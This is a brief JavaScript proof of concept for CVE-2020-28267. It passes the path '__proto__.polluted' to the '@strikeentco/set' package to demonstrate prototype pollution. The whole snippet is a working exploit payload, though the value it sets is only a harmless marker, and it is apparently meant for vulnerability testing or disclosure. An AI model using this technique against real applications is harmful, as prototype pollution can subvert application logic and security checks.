//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
    const sset = require('@strikeentco/set');
    var obj = {}

    sset(obj, '__proto__.polluted', "yes");
